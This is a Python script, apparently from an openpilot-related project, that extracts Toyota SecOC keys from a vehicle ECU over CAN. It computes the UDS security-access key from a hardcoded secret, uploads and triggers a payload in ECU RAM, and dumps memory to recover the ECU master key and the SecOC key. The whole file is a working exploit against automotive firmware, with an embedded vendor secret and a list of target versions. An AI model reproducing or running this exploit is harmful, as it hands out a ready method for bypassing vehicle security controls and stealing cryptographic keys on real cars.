#!/usr/bin/env python3
import struct
import time
from subprocess import check_output, CalledProcessError

from Crypto.Cipher import AES
from tqdm import tqdm

from opendbc.car.isotp import isotp_send
from opendbc.car.structs import CarParams
from opendbc.car.uds import UdsClient, ACCESS_TYPE, SESSION_TYPE, DATA_IDENTIFIER_TYPE, SERVICE_TYPE, \
  ROUTINE_CONTROL_TYPE, InvalidServiceIdError, MessageTimeoutError, NegativeResponseError
from panda import Panda
from tsk.common.env import is_agnos


class NotAGNOSError(Exception):
  def __str__(self) -> str:
    return "Can't run TSK Extractor outside of a comma device."


class BoarddNotRunningError(Exception):
  pass


class RetryError(Exception):
  def __init__(self, message: str):
    self.message: str = message

  def __str__(self) -> str:
    return f"{self.message}\n\nTry again. If the problem persists, turn off the car, put it back into 'Not Ready to Drive' mode, and then try again."


def format_version_for_error_display(version1, version2=None, length=8):
  version_str = ""

  version1_str = str(version1)
  if version1_str.startswith("b'"):
    version1_str = version1_str[2:]

  version_str = version1_str[:length]

  if version2 and version1 != version2:
    version2_str = str(version2)
    if version2_str.startswith("b'"):
      version2_str = version2_str[2:]

    version_str += ", " + version2_str[:length]

  return version_str


class TSKExtractor:
  ADDR = 0x7a1
  DEBUG = False
  BUS = 0

  SEED_KEY_SECRET = b'\xf0\x5f\x36\xb7\xd7\x8c\x03\xe2\x4a\xb4\xfa\xef\x2a\x57\xd0\x44'

  # These are the key and IV used to encrypt the payload in build_payload.py
  DID_201_KEY = b'\x00' * 16
  DID_202_IV = b'\x00' * 16

  # Confirmed working on the following versions
  APPLICATION_VERSIONS = {
    b'\x018965B4209000\x00\x00\x00\x00': b'\x01!!!!!!!!!!!!!!!!',  # 2021 RAV4 Prime
    b'\x018965B4233100\x00\x00\x00\x00': b'\x01!!!!!!!!!!!!!!!!',  # 2023 RAV4 Prime
    b'\x018965B4509100\x00\x00\x00\x00': b'\x01!!!!!!!!!!!!!!!!',  # 2021 Sienna
  }

  KEY_STRUCT_SIZE = 0x20
  CHECKSUM_OFFSET = 0x1d
  SECOC_KEY_SIZE = 0x10
  SECOC_KEY_OFFSET = 0x0c

  @classmethod
  def _get_key_struct(cls, data, key_no):
    return data[key_no * cls.KEY_STRUCT_SIZE: (key_no + 1) * cls.KEY_STRUCT_SIZE]

  @classmethod
  def _verify_checksum(cls, key_struct):
    checksum = sum(key_struct[:cls.CHECKSUM_OFFSET])
    checksum = ~checksum & 0xff
    return checksum == key_struct[cls.CHECKSUM_OFFSET]

  @classmethod
  def _get_secoc_key(cls, key_struct):
    return key_struct[cls.SECOC_KEY_OFFSET:cls.SECOC_KEY_OFFSET + cls.SECOC_KEY_SIZE]

  @classmethod
  def hack(cls):
    """Initializes the ECU connection and checks if boardd is running."""
    if not is_agnos():
      raise NotAGNOSError

    try:
      check_output(["pidof", "boardd"])
      # This shouldn't happen since we never started boardd
      raise BoarddNotRunningError("boardd is running, kill openpilot and run again")
    except CalledProcessError as e:
      if e.returncode != 1:  # 1 == no process found (boardd not running)
        raise e
    except FileNotFoundError:
      pass

    panda = Panda()
    panda.set_safety_mode(CarParams.SafetyModel.elm327)

    uds_client = UdsClient(panda, cls.ADDR, cls.ADDR + 8, cls.BUS, timeout=0.1, response_pending_timeout=0.1)

    print("Getting application versions...")

    try:
      app_version = uds_client.read_data_by_identifier(DATA_IDENTIFIER_TYPE.APPLICATION_SOFTWARE_IDENTIFICATION)
      print(f" - APPLICATION_SOFTWARE_IDENTIFICATION (application): {str(app_version)}")
    except (AssertionError, InvalidServiceIdError, MessageTimeoutError, NegativeResponseError):
      raise RetryError("Car not detected")

    if app_version not in cls.APPLICATION_VERSIONS:
      print(f"Unexpected application version (ignored): {str(app_version)}")

    # Mandatory flow of diagnostic sessions
    try:
      uds_client.diagnostic_session_control(SESSION_TYPE.DEFAULT)
      uds_client.diagnostic_session_control(SESSION_TYPE.EXTENDED_DIAGNOSTIC)
      uds_client.diagnostic_session_control(SESSION_TYPE.PROGRAMMING)
      uds_client.diagnostic_session_control(SESSION_TYPE.DEFAULT)
      uds_client.diagnostic_session_control(SESSION_TYPE.EXTENDED_DIAGNOSTIC)
    except (InvalidServiceIdError, MessageTimeoutError, NegativeResponseError):
      raise RetryError("Car not in 'Not Ready To Drive' mode")

    # Get bootloader version
    try:
      bl_version = uds_client.read_data_by_identifier(DATA_IDENTIFIER_TYPE.APPLICATION_SOFTWARE_IDENTIFICATION)
    except (AssertionError, InvalidServiceIdError, MessageTimeoutError, NegativeResponseError):
      raise RetryError(f"Can't read bootloader version ({format_version_for_error_display(app_version)})")
    print(f" - APPLICATION_SOFTWARE_IDENTIFICATION (bootloader) {str(bl_version)}")

    try:
      if bl_version != cls.APPLICATION_VERSIONS[app_version]:
        print(f"Unexpected bootloader version (ignored): {str(bl_version)}")
    except KeyError as e: # In case app_version is not found at all
      print(f"Unexpected bootloader version (ignored): {str(e)}")

    # Go back to programming session
    try:
      uds_client.diagnostic_session_control(SESSION_TYPE.PROGRAMMING)
    except (InvalidServiceIdError, MessageTimeoutError, NegativeResponseError):
      raise RetryError("Can't enter programming session for reading bootloader version")

    # Security Access - Request Seed
    try:
      seed_payload = b"\x00" * 16
      seed = uds_client.security_access(ACCESS_TYPE.REQUEST_SEED, data_record=seed_payload)

      key = AES.new(cls.SEED_KEY_SECRET, AES.MODE_ECB).decrypt(seed_payload)
      key = AES.new(key, AES.MODE_ECB).encrypt(seed)

      print("\nSecurity Access...")

      print(" - SEED:", seed.hex())
      print(" - KEY:", key.hex())

      # Security Access - Send Key
      uds_client.security_access(ACCESS_TYPE.SEND_KEY, key)
      print(" - Key OK!")

    except (InvalidServiceIdError, MessageTimeoutError, NegativeResponseError):
      raise RetryError("Security Access failed")

    # Security Access - Send Key
    print("\nPreparing to upload payload...")

    try:
      # Write something to DID 203, not sure why but needed for state machine
      uds_client.write_data_by_identifier(0x203, b"\x00" * 5)

      # Write KEY and IV to DID 201/202, prerequisite for request download
      print(" - Write data by identifier 0x201", cls.DID_201_KEY.hex())
      uds_client.write_data_by_identifier(0x201, cls.DID_201_KEY)

      print(" - Write data by identifier 0x202", cls.DID_202_IV.hex())
      uds_client.write_data_by_identifier(0x202, cls.DID_202_IV)

      # Request download to RAM
      data = b"\x01"  # [1] Format
      data += b"\x46"  # [2] 4 size bytes, 6 address bytes
      data += b"\x01"  # [3] memoryIdentifier
      data += b"\x00"  # [4]
      data += struct.pack('!I', 0xfebf0000)  # [5] Address
      data += struct.pack('!I', 0x1000)  # [9] Size

      print("\nUpload payload...")

      print(" - Request download")
      resp = uds_client._uds_request(SERVICE_TYPE.REQUEST_DOWNLOAD, data=data)

      # Upload payload
      payload = open("/data/openpilot/tsk/tools_menu/payload.bin", "rb").read()
      assert len(payload) == 0x1000
      chunk_size = 0x400
      for i in range(len(payload) // chunk_size):
        print(f" - Transfer data {i}")
        uds_client.transfer_data(i + 1, payload[i * chunk_size:(i + 1) * chunk_size])

      uds_client.request_transfer_exit()

      print("\nVerify payload...")

      # Routine control 0x10f0
      # [0] 0x31 (routine control)
      # [1] 0x01 (start)
      # [2] 0x10f0 (routine identifier)
      # [4] 0x45 (format, 4 size bytes, 5 address bytes)
      # [5] 0x0
      # [6] mem addr
      # [10] mem addr
      data = b"\x45\x00"
      data += struct.pack('!I', 0xfebf0000)
      data += struct.pack('!I', 0x1000)

      uds_client.routine_control(ROUTINE_CONTROL_TYPE.START, 0x10f0, data)
      print(" - Routine control 0x10f0 OK!")

    except (InvalidServiceIdError, MessageTimeoutError, NegativeResponseError):
      raise RetryError("Payload upload failed")

    print("\nTrigger payload...")

    # Now we trigger the payload by trying to erase
    # [0] 0x31 (routine control)
    # [1] 0x01 (start)
    # [2] 0xff00 (routine identifier)
    # [4] 0x45 (format, 4 size bytes, 5 address bytes)
    # [5] 0x0
    # [6] mem addr
    # [10] mem addr
    data = b"\x45\x00"
    data += struct.pack('!I', 0xe0000)
    data += struct.pack('!I', 0x8000)

    # Manually send so we don't get stuck waiting for the response
    erase = b"\x31\x01\xff\x00" + data
    isotp_send(panda, erase, cls.ADDR, bus=cls.BUS)

    print("\nDumping keys...")
    start = 0xfebe6e34
    end = 0xfebe6ff4

    start_time = time.time()
    timeout = 30

    extracted = b""

    with open(f'data_{start:08x}_{end:08x}.bin', 'wb') as f:
      with tqdm(total=end - start) as pbar:
        while start < end:

          current_time = time.time()
          if current_time - start_time > timeout:
            raise RetryError("Key dumping timed out")

          for addr, *_, data, bus in panda.can_recv():
            if bus != cls.BUS:
              continue

            if data == b"\x03\x7f\x31\x78\x00\x00\x00\x00":  # Skip response pending
              continue

            if addr != cls.ADDR + 8:
              continue

            if cls.DEBUG:
              print(f"{data.hex()}")

            ptr = struct.unpack("<I", data[:4])[0]
            assert (ptr >> 8) == start & 0xffffff  # Check lower 24 bits of address

            extracted += data[4:]
            f.write(data[4:])
            f.flush()

            start += 4
            pbar.update(4)

            start_time = time.time()

    key_1_ok = cls._verify_checksum(cls._get_key_struct(extracted, 1))
    key_4_ok = cls._verify_checksum(cls._get_key_struct(extracted, 4))

    if not key_1_ok or not key_4_ok:
      raise RetryError(f"SecOC key checksum verification failed ({format_version_for_error_display(app_version, bl_version)})")

    key_1 = cls._get_secoc_key(cls._get_key_struct(extracted, 1))
    key_4 = cls._get_secoc_key(cls._get_key_struct(extracted, 4))

    print("\nECU_MASTER_KEY   ", key_1.hex())
    print("SecOC Key (KEY_4)", key_4.hex())

    return key_4.hex()

  @classmethod
  def run(cls):
    try:
      secoc_key = cls.hack()
    except (BoarddNotRunningError, RetryError):
      raise
    except Exception as e:
      e.add_note("\n\n!!!! Unexpected error. Please take a photo, post it on #toyota-security, and ping @calvinspark\n")
      raise

    print("SecOC key extracted successfully")
    print("!!!! Take a photo of this screen")
    return secoc_key
